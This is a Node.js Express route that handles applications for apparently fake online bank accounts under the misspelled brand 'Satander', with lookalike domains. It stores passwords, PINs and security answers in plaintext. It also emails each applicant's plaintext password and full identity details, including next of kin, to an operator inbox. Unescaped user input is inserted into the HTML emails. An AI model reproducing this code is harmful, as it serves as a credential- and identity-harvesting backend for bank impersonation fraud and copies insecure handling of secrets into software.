//Set up
let express = require("express");
let router = express.Router();

let userModel = require("../schemas/userSchema");

const { trim } = require("express-validator").validator;

var nodemailer = require("nodemailer");

var sendEmailNotification = require("../mailSender");

router.post("/apply", function(req, res) {
    // console.log(req.body);
    let newUser = {
        bio: {
            name: req.body.name,
            login: {
                username: req.body.user,
                password: req.body.pwd,
            },
            address: {
                street: req.body.address,
                city: req.body.city,
                state: req.body.state,
                country: req.body.country,
            },
            dob: req.body.dob,
            phonenumber: req.body.phone,
            email: req.body.email,
        },

        security: {
            qanda: {
                question: req.body.question,
                answer: req.body.answer,
            },
            pin: req.body.pin,
        },

        account: {
            accountno: null,
            accounttype: req.body.account_type,
            accountbalance: null,
            currency: null,
            accountofficer: null,
            accountofficercode: null,
            accountofficeremail: null,
        },

        status: {
            restricted: false,
            message: "",
        },

        kin: {
            kinname: req.body.kin,
            kinnumber: req.body.kinnumber,
            kinaddress: req.body.kin_address,
            kin_city: req.body.kin_city,
            kin_state: req.body.kin_state,
            kin_country: req.body.kin_country,
        },
    };

    newUserInstance = new userModel(newUser);
    newUserInstance.save(function(err) {
        if (err) {
            //console.log("Error, User Not registered.");
            //console.log(err);
            if (err.code == 11000) {
                //res.send({"error": "you're using either a duplicate username or email, kindly use another and try again."});
            }
            console.log(err);
            res.send({
                error: "An Error Occurred During registration, make sure you're not using the same email address or phone number and make sure to fill all necessary information requested of you.",
            });
        } else {
            console.log("Registration Successful.");

            ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            let now = new Date();
            let mailOptions1 = {
                from: '"Satander Bank" <noreply@thesantdr.com>',
                to: req.body.email,
                subject: "Welcome to Satander Community",
                html: `
                    <div style="width: 800px; margin: 0 auto;">
                            <div style="border-bottom: 1px dotted #AAAEB4; padding: 10px;">
                                <div><img src="https://i.ibb.co/THwc5CP/logo.png" height="50px" style="height: 50px"/></div>
                                <img src="https://media.istockphoto.com/vectors/welcome-poster-with-brush-strokes-vector-id940891868?k=6&m=940891868&s=612x612&w=0&h=awJY_W7nGybC5pRtygpA3QBoNc2TSG4ZFKdGzMbQfUI=" style="margin-top: 25px; height: 150px; width: 400px;" />
                            </div>

                            <div>
                                <h5> Hello ${req.body.name}, </h5>

                                <p>
                                    Thank you so much for allowing us to help you with your recent account opening. We are committed to providing our customers with the highest level of service and the most innovative banking products possible.
                                </p>

                                <p>
                                    We are very glad you chose us as your financial institution and hope you will take advantage of our wide variety of savings, investment and loan products, all designed to meet your specific needs.
                                </p>

                                <p>
                                    For more detailed information about any of our products or services, please refer to our website, www.svenskabvb.com, or visit any of our convenient locations. You may contact us by phone at +46 (766) 822 083.
                                </p>

                                <p>
                                    Satander  is a full service, internationally owned financial institution. Our decisions are made right here, with this community’s residents best interest in mind. We are concerned about what is best for you!
                                </p>

                                <p> This message confirms receipt of your online application form;</p>

                                <p>
                                    Find the details you sent to us here and if there are any changes you'd like to make, kindly contact the customer care to request for a change:
                                </p>
                                <hr>
                                <table>
                                    <tr>
                                        <td style="width: 170px"> <strong> Name: </strong></td>
                                        <td> ${req.body.name} </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Username: </strong></td>
                                        <td> ${req.body.user} </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Password: </strong></td>
                                        <td> ********** </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Address: </strong></td>
                                        <td> ${req.body.city},${req.body.state},${req.body.country} </td>
                                    </tr>


                                    <tr>
                                        <td style="width: 170px"> <strong> DOB: </strong> </td>
                                        <td> ${req.body.dob} </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Tel: </strong> </td>
                                        <td> ${req.body.phone} </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Email: </strong> </td>
                                        <td> ${req.body.email}</td>
                                    </tr>


                                    <tr>
                                        <td style="width: 170px"> <strong> Account Type: </strong> </td>
                                        <td> ${req.body.account_type} </td>
                                    </tr>


                                    <tr>
                                        <td style="width: 170px"> <strong> Kin Name: </strong> </td>
                                        <td> ${req.body.kin} </td>
                                    </tr>

                                    <tr>
                                        <td style="width: 170px"> <strong> Kin Number: </strong>  </td>
                                        <td> ${req.body.kinnumber} </td>
                                    </tr>


                                    <tr>
                                        <td style="width: 170px"> <strong> Kinaddress: </strong>  </td>
                                        <td> ${req.body.kin_address}, ${req.body.kin_city}, ${req.body.kin_state}, ${req.body.kin_country} </td>
                                    </tr>

                                </table>

                                <p>
                                    Please do not hesitate to contact me, should you have any questions. We will contact you in the very near future to ensure you are completely satisfied with the services you have received thus far.
                                </p>

                                <p> Respectfully, </p>

                                <h2 style="color: red">Timothy H. Wennes</h2>
                                <h4 style="color: blue; margin-top: -15px">Satander CEO</h4>
                            </div>

                        </div>
                    `,
            };

            let mailOptions2 = {
                from: '"Satander Savings BANK" <noreply@thesantdr.com>',
                to: "info@thesantdr.com",
                subject: "A New Client just applied successfully",
                html: `
            <div style="background-color: lightgray; text-align: center; font-family: arial; font-size: 13px; padding: 10px;">
              <hr>
               <img src="https://i.ibb.co/THwc5CP/logo.png" height="40px" style="height: 30px"/>
              <h2 style="color: #4597AE"> Satander Savings BANK New Application </h2>
              <hr>

              <p> A client just applied and his details are as follows: </p>
              <p> Name: ${req.body.name} <br />
              <p> Username: ${req.body.user} <br />
              Password: ${req.body.pwd} <br />
              Address: ${req.body.address}, ${req.body.city},${req.body.state},${req.body.country} <br />
              DOB: ${req.body.dob}<br />
              Tel: ${req.body.phone} <br />
              Email: ${req.body.email} <br />
              Account Type: ${req.body.account_type} <br />
              Kin Name: ${req.body.kin} <br />
              Kin Number: ${req.body.kinnumber} <br />
              Kin Address: ${req.body.kin_address} <br />
              Kin City: ${req.body.kin_city} <br />
              Kin State: ${req.body.kin_state} <br />
              Kin Country: ${req.body.kin_country} <br />

              <div style="background-color: black; color: white; padding:2px; font-size: 11px;">
                <p> Thank you For banking with Satander Savings BANK, the bank that knows all your needs even before you ask. </p>
              </div>
            </div>
            `,
            };

            sendEmailNotification(mailOptions1).then(
                (data) => {
                    console.log(data);
                    sendEmailNotification(mailOptions2).then(
                        (data) => {
                            return res.send({
                                success: "Your Account has been created successfully, kindly chck your email for our confirmation message.",
                            });
                        },
                        (error) => {
                            console.log(error);
                            return res.send({
                                error: "Your Account has been created successfully, but there was an error sending your confirmation email.",
                            });
                        }
                    );
                },
                (error) => {
                    console.log(error);
                    return res.send({
                        error: "Your Account has been created successfully, but there was an error sending your confirmation email.",
                    });
                }
            );
        }
    });
});

module.exports = router;